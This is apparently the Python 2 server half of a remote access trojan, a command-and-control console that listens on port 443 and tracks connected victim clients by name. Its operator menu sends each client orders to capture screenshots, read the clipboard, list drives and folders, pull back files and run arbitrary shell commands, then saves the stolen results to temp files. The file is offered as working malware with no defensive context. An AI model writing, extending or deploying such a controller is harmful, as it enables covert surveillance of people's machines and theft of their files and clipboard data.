#coding:utf-8
import socket
import threading
import sqlite3
import time
import sys
import traceback
import tempfile
import uuid
import struct

host = "0.0.0.0"
port = 443
LISTEN_NUM = 200

client_ls = dict()

def listen():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host,port))
    server.listen(LISTEN_NUM)
    while True:
        client, addr = server.accept()
        th = threading.Thread(target=handle_client, args=(client,))
        th.start()

def handle_client(client_socket):
    ip = None
    try:
        msg = recv_content(client_socket)
        msg = msg.strip()
        if msg.startswith("HELO,"):
            print
            print "client %s connect"%(msg[5:])
            print 
            client_ls[msg[5:]] = client_socket
    except:
        traceback.print_exc()
        if ip is not None:
            del client_ls[ip]

def send_content(sock, content):
    sock.send(content)

def recv_content(sock):
    header = sock.recv(4)
    total_size = struct.unpack('i', header)[0]
    recv_size = 0
    res = b''
    while recv_size < total_size:
        recv_data = sock.recv(1024)
        res += recv_data
        recv_size += len(recv_data)
    return res

def ls():
    print "clients:"
    for item in client_ls.keys():
        print item

def snapshot(client_socket):
    try:
        send_content(client_socket, "snapshot")
        img_content = recv_content(client_socket)
        file_name = tempfile.gettempdir() + "/" + str(uuid.uuid1()) + ".bmp"
        with open(file_name, "wb") as f:
            f.write(img_content)
        print "recv snapshot:%s"%(file_name)
    except:
        traceback.print_exc()

def clipboard(client_socket):
    try:
        send_content(client_socket, "clipboard")
        txt_content = recv_content(client_socket)
        file_name = tempfile.gettempdir() + "/" + str(uuid.uuid1()) + ".txt"
        with open(file_name, "w") as f:
            f.write(txt_content)
        print "recv clipboard:%s"%(file_name)
    except:
        traceback.print_exc()

def show_driver(client_socket):
    try:
        send_content(client_socket, "showdriver")
        content = recv_content(client_socket)
        print content
    except:
        traceback.print_exc()

def get_file_list(client_socket, folder):
    try:
        send_content(client_socket, "getfilelist " + folder)
        content = recv_content(client_socket)
        print content
    except:
        traceback.print_exc()

def get_file(client_socket, filepath):
    try:
        send_content(client_socket, "getfile " + filepath)
        content = recv_content(client_socket)
        if "doesn't exist" in str(content):
            print content
        else:
            file_name = tempfile.gettempdir() + "/" + str(uuid.uuid1())
            with open(file_name, "wb") as f:
                f.write(content)
                f.flush()
            print "recv file:%s"%(file_name)
    except:
        traceback.print_exc()

def execute_cmd(client_socket, cmd):
    try:
        send_content(client_socket, "cmd " + cmd)
        content = recv_content(client_socket)
        print "cmd rtn:"+content
    except:
        traceback.print_exc()

def menu():
    print "command:"
    print "ls"
    print "snapshot"
    print "clipboard"
    print "cmd"
    print "showdriver"
    print "getfilelist"
    print "getfile"
    print
    print "input<<",

if __name__ == '__main__':
    th = threading.Thread(target=listen)
    th.start()
    while True:
        print
        menu()
        msg = str(raw_input())
        msg = msg.strip()
        if msg == 'ls':
            ls()
        elif msg.startswith("cmd "):
            msgs = msg.split(" ")
            print msgs
            if len(msgs) < 3:
                print "parameter error"
            else:
                ip = msgs[1]
                cmd = " ".join(msgs[2:])
                print ip,cmd
                if ip not in client_ls.keys():
                    print "client %s does not exist"%(ip,)
                execute_cmd(client_ls[ip], cmd)
        elif msg.startswith("snapshot "):
            ip = msg.split(" ")[1]
            if ip not in client_ls.keys():
                print "client %s does not exist"%(ip,)
            snapshot(client_ls[ip])
        elif msg.startswith("clipboard "):
            ip = msg.split(" ")[1]
            if ip not in client_ls.keys():
                print "client %s does not exist"%(ip,)
            clipboard(client_ls[ip])
        elif msg.startswith("cmd "):
            ip = msg.split(" ")[1]
            if ip not in client_ls.keys():
                print "client %s does not exist"%(ip,)
        elif msg.startswith("showdriver "):
            ip = msg.split(" ")[1]
            if ip not in client_ls.keys():
                print "client %s does not exist"%(ip,)
            show_driver(client_ls[ip])
        elif msg.startswith("getfilelist "):
            msgs = msg.split(" ")
            if len(msgs) < 3:
                print "parameter error"
            else:
                ip = msgs[1]
                folder = " ".join(msgs[2:])
                if ip not in client_ls.keys():
                    print "client %s does not exist"%(ip,)
                get_file_list(client_ls[ip], folder)
        elif msg.startswith("getfile "):
            msgs = msg.split(" ")
            if len(msgs) < 3:
                print "parameter error"
            else:
                ip = msgs[1]
                filepath = " ".join(msgs[2:])
                if ip not in client_ls.keys():
                    print "client %s does not exist"%(ip,)
                get_file(client_ls[ip], filepath)